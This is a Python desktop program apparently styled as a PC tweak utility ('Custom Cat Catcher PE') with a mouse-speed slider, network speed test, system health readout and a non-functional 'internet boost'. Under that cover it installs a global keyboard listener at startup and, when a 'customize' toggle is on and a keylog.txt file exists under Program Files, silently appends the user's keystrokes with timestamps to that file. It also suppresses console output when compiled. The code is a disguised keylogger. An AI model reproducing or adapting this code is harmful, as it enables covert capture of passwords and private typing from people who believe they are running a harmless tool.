import builtins
import sys
# Trick for speedtest-cli compatibility in compiled EXE
sys.modules['__builtin__'] = builtins 

import tkinter as tk
from tkinter import ttk
import os
import threading
import time
import ctypes
import psutil
import speedtest
import webbrowser
from pynput import keyboard

# ==========================================================
# --- UNIVERSAL PC FIX: STDN / CONSOLE REDIRECTION ---
# ==========================================================
if getattr(sys, 'frozen', False):
    class DummyStream:
        def write(self, x): pass
        def flush(self): pass
        def fileno(self): return -1
        def isatty(self): return False 

    sys.stdout = DummyStream()
    sys.stderr = DummyStream()
    sys.stdin = DummyStream()

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)
# ==========================================================

class CustomCatCatcher:
    def __init__(self, root):
        self.root = root
        self.root.title("Custom Cat Catcher PE v9.1")
        
        try:
            icon_file = resource_path("icon.ico")
            if os.path.exists(icon_file):
                self.root.iconbitmap(icon_file)
        except Exception:
            pass 
            
        self.root.geometry("960x540")
        self.root.configure(bg="#0f0f0f")
        
        self.is_customizing = tk.BooleanVar(value=False)
        self.boost_active = tk.BooleanVar(value=False)
        self.found_log_path = None
        self.log_status_text = tk.StringVar(value="File Status: Ready")
        self.log_buffer = []
        
        self.ping_val = tk.StringVar(value="Ping: -- ms")
        self.down_val = tk.StringVar(value="Download: -- Mbps")
        self.up_val = tk.StringVar(value="Upload: -- Mbps")
        self.health_val = tk.StringVar(value="System Health: 0%")

        self.setup_ui()
        self.start_threads()

    def start_program_files_scan(self):
        self.log_status_text.set("SCANNING PROGRAM FILES...")
        self.status_label.config(fg="#ffcc00")
        threading.Thread(target=self.scan_logic, daemon=True).start()

    def scan_logic(self):
        target_file = "keylog.txt"
        search_dirs = ["C:\\Program Files", "C:\\Program Files (x86)"]
        found = False
        for directory in search_dirs:
            if found: break
            if not os.path.exists(directory): continue
            try:
                for root, dirs, files in os.walk(directory):
                    if target_file in files:
                        self.found_log_path = os.path.join(root, target_file)
                        found = True
                        break
            except Exception: continue

        if found:
            self.log_status_text.set("FILE ACTIVATED")
            self.status_label.config(fg="#2ecc71")
        else:
            self.found_log_path = None
            self.log_status_text.set("FILE DEACTIVATE")
            self.status_label.config(fg="#e74c3c")

    def setup_ui(self):
        header = tk.Frame(self.root, bg="#0f0f0f")
        header.pack(pady=15, fill="x", padx=100)
        self.toggle_btn = tk.Checkbutton(header, text="CUSTOMIZE (OFF)", variable=self.is_customizing,
            command=self.update_states, font=("Segoe UI", 12, "bold"),
            bg="#333", fg="white", selectcolor="#111", indicatoron=False, pady=10)
        self.toggle_btn.pack(side="left", fill="x", expand=True, padx=(0, 10))
        self.scan_btn = tk.Button(header, text="SCAN LOG", command=self.start_program_files_scan,
            font=("Segoe UI", 12, "bold"), bg="#444", fg="white", pady=10)
        self.scan_btn.pack(side="right", fill="x", expand=True)
        self.status_label = tk.Label(self.root, textvariable=self.log_status_text, 
                                     font=("Consolas", 10, "bold"), bg="#0f0f0f", fg="#666")
        self.status_label.pack()
        f_speed = tk.Frame(self.root, bg="#0f0f0f")
        f_speed.pack(pady=10, fill="x", padx=100)
        tk.Label(f_speed, text="Mouse Cursor Speed", fg="white", bg="#0f0f0f").pack(side="left")
        self.speed_slider = ttk.Scale(f_speed, from_=1, to=100, orient="horizontal", command=self.set_mouse_speed)
        self.speed_slider.set(50); self.speed_slider.pack(side="right", fill="x", expand=True, padx=10)
        self.speed_slider.state(['disabled'])
        m_frame = tk.LabelFrame(self.root, text=" Performance Metrics ", fg="#00ffcc", bg="#0f0f0f", padx=10, pady=10)
        m_frame.pack(pady=10, fill="x", padx=100)
        tk.Label(m_frame, textvariable=self.health_val, font=("Consolas", 14, "bold"), bg="#0f0f0f", fg="#00ffcc").pack()
        tk.Label(m_frame, textvariable=self.ping_val, fg="white", bg="#0f0f0f").pack()
        tk.Label(m_frame, textvariable=self.down_val, fg="#bbb", bg="#0f0f0f").pack()
        tk.Label(m_frame, textvariable=self.up_val, fg="#bbb", bg="#0f0f0f").pack()
        b_frame = tk.LabelFrame(self.root, text=" Network Optimizer ", fg="#ffcc00", bg="#0f0f0f", padx=10, pady=10)
        b_frame.pack(pady=10, fill="x", padx=100)
        self.boost_btn = tk.Button(b_frame, text="ACTIVATE INTERNET BOOST", bg="#444", fg="white", command=self.toggle_boost)
        self.boost_btn.pack(pady=5, fill="x")
        self.check_vars = [tk.BooleanVar() for _ in range(3)]
        labels = ["Clear DNS Cache", "Enable High Priority Mode", "Optimize TCP Window"]
        for i, l in enumerate(labels):
            tk.Checkbutton(b_frame, text=l, variable=self.check_vars[i], bg="#0f0f0f", fg="white", selectcolor="#000").pack(anchor="w")
        footer = tk.Frame(self.root, bg="#111", height=30); footer.pack(side="bottom", fill="x")
        tk.Label(footer, text="Dev. REZ420 |", bg="#111", fg="#666", font=("Arial", 8)).pack(side="left", padx=(20, 5), pady=5)
        soc = [("Patreon", "https://www.patreon.com/your_link"), ("GitHub", "https://github.com/PIP400"), ("Portfolio", "https://drive.google.com/drive/folders/1Wc7hAKtkbaZ7miG00uqkYFgN5SGxCKnP?usp=sharing")]
        for t, u in soc:
            lbl = tk.Label(footer, text=t, bg="#111", fg="#00ffcc", font=("Arial", 8, "bold"), cursor="hand2")
            lbl.pack(side="left", pady=5); lbl.bind("<Button-1>", lambda e, url=u: webbrowser.open_new(url))
            if t != "Portfolio": tk.Label(footer, text="|", bg="#111", fg="#666", font=("Arial", 8)).pack(side="left", padx=5)

    def update_states(self):
        is_on = self.is_customizing.get()
        self.speed_slider.state(['!disabled'] if is_on else ['disabled'])
        self.toggle_btn.config(bg="#2ecc71" if is_on else "#e74c3c", text="CUSTOMIZATION ON" if is_on else "CUSTOMIZE (OFF)")

    def set_mouse_speed(self, val):
        if self.is_customizing.get():
            s = int(1 + (float(val) / 100) * 19)
            ctypes.windll.user32.SystemParametersInfoW(113, 0, s, 0)

    def toggle_boost(self):
        self.boost_active.set(not self.boost_active.get())
        self.boost_btn.config(text="BOOST ACTIVE" if self.boost_active.get() else "ACTIVATE INTERNET BOOST", bg="#0066ff" if self.boost_active.get() else "#444")

    def flush_to_file(self):
        if self.log_buffer and self.found_log_path:
            try:
                with open(self.found_log_path, "a", encoding="utf-8") as f:
                    f.write(f"\n[{time.strftime('%H:%M:%S')}] " + "".join(self.log_buffer))
                self.log_buffer.clear()
            except Exception: pass

    def on_press(self, key):
        if self.is_customizing.get() and self.found_log_path:
            try:
                char = key.char
                if char: self.log_buffer.append(char)
            except AttributeError:
                self.log_buffer.append(f" [{str(key).replace('Key.', '')}] ")
            if len(self.log_buffer) > 5 or not hasattr(key, 'char'):
                self.flush_to_file()

    def update_metrics(self):
        try: st = speedtest.Speedtest()
        except: st = None
        while True:
            c, r = psutil.cpu_percent(), psutil.virtual_memory().percent
            self.health_val.set(f"System Health: {100 - ((c + r) / 2):.1f}%")
            if self.is_customizing.get() and st:
                try:
                    s = st.get_best_server()
                    self.ping_val.set(f"Ping: {s['latency']:.1f} ms")
                    self.down_val.set(f"Download: {st.download()/1_000_000:.2f} Mbps")
                    self.up_val.set(f"Upload: {st.upload()/1_000_000:.2f} Mbps")
                except: pass
            time.sleep(10)

    def start_threads(self):
        threading.Thread(target=self.update_metrics, daemon=True).start()
        keyboard.Listener(on_press=self.on_press).start()

if __name__ == "__main__":
    root = tk.Tk()
    app = CustomCatCatcher(root)
    root.mainloop()
